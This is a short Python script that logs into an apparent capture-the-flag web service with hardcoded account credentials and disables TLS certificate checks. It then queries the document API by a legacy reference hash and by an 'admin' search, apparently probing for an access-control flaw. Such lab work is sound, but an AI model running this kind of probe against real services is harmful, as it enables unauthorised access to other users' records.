import requests

session = requests.Session()
url_login = "https://ctf.marabit.xyz/api/auth/login"
data = {"email": "analyst@blackarchive.local", "password": "ArchiveAccess2026!"}
session.post(url_login, json=data, verify=False)

url = "https://ctf.marabit.xyz/api/documents?legacyRef=70efdf2ec9b086079795c442636b55fb"
r = session.get(url, verify=False)
print("By legacyRef:", r.status_code, r.text)

url2 = "https://ctf.marabit.xyz/api/documents?search=admin"
r2 = session.get(url2, verify=False)
print("By search:", r2.status_code, r2.text)
